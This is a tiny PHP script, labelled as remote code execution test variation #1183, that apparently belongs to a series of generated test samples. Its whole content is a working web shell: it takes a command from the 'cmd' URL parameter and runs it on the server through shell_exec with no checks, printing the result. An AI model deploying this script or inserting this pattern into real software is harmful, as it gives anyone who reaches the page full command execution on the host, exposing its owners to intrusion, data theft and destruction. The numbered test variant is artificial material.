<?php
// RCE test variation #1183
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>